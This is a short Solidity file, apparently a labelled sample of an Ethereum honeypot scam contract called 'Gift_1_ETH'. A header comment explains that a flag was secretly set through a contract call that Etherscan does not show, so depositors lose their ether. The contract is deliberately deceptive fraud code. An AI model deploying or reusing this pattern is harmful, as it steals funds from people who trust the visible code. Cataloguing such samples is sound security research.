/*
 * Title: Hidden Call
 * Trick: passHasBeenSet has been set to True via message call from the other contract, which is invisible on Etherscan
 * Reference: https://etherscan.io/address/0x75041597d8f6e869092d78b9814b7bcdeeb393b4#code
*/
pragma solidity ^0.4.19;

contract Gift_1_ETH
{
    bool passHasBeenSet = false;

    function()payable{}

    function GetHash(bytes pass) constant returns (bytes32) {return sha3(pass);}

    bytes32 public hashPass;

    function SetPass(bytes32 hash)
    public
    payable
    {
        if(!passHasBeenSet&&(msg.value >= 1 ether))
        {
            hashPass = hash;
        }
    }

    function GetGift(bytes pass)
    external
    payable
    {
        if(hashPass == sha3(pass))
        {
            msg.sender.transfer(this.balance);
        }
    }

    function PassHasBeenSet(bytes32 hash)
    public
    {
        if(hash==hashPass)
        {
           passHasBeenSet=true;
        }
    }
}